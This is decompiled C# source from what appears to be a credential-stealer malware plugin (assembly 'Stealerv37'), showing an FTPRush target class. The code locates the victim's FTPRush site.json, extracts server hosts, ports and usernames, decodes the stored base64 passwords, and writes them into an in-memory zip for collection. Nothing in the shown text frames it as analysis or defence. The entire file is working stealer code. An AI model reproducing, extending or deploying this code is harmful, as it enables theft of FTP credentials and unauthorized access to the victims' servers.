// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Applications.FTPRush
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

#nullable disable
namespace Intelix.Targets.Applications;

public class FTPRush : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string path = $"C:\\Users\\{Environment.UserName}\\Documents\\FTPRush\\site.json";
    if (!File.Exists(path))
      return;
    string str1 = File.ReadAllText(path);
    Regex regex1 = new Regex("\"Server\"\\s*:\\s*\\{(.*?)\\}", RegexOptions.IgnoreCase | RegexOptions.Singleline);
    Regex regex2 = new Regex("\"Host\"\\s*:\\s*\"(?<host>[^\"]*)\"", RegexOptions.IgnoreCase);
    Regex regex3 = new Regex("\"Port\"\\s*:\\s*(?<port>\\d+)", RegexOptions.IgnoreCase);
    Regex regex4 = new Regex("\"Username\"\\s*:\\s*\"(?<user>[^\"]*)\"", RegexOptions.IgnoreCase);
    Regex regex5 = new Regex("\"Base64Password\"\\s*:\\s*\"(?<b64>[^\"]*)\"", RegexOptions.IgnoreCase);
    List<string> values = new List<string>();
    Counter.CounterApplications counterApplications = new Counter.CounterApplications()
    {
      Name = nameof (FTPRush)
    };
    string input1 = str1;
    foreach (Match match1 in regex1.Matches(input1))
    {
      string input2 = match1.Groups[1].Value;
      Match match2 = regex2.Match(input2);
      if (match2.Success)
      {
        string str2 = match2.Groups["host"].Value;
        Match match3 = regex3.Match(input2);
        string str3 = match3.Success ? match3.Groups["port"].Value : "21";
        Match match4 = regex4.Match(input2);
        string str4 = match4.Success ? match4.Groups["user"].Value : "";
        Match match5 = regex5.Match(input2);
        string str5 = "";
        if (match5.Success)
        {
          if (!string.IsNullOrEmpty(match5.Groups["b64"].Value))
          {
            try
            {
              str5 = Encoding.UTF8.GetString(Convert.FromBase64String(match5.Groups["b64"].Value));
            }
            catch
            {
              str5 = "";
            }
          }
        }
        values.Add($"Url: {str2}:{str3}\nUsername: {str4}\nPassword: {str5}\n");
        counterApplications.Files.Add(path + " => FTPRush\\Hosts.txt");
      }
    }
    if (values.Count <= 0)
      return;
    string entryPath = "FTPRush\\Hosts.txt";
    zip.AddFile(entryPath, Encoding.UTF8.GetBytes(string.Join("\n", (IEnumerable<string>) values)));
    counterApplications.Files.Add(entryPath);
    counter.Applications.Add(counterApplications);
  }
}
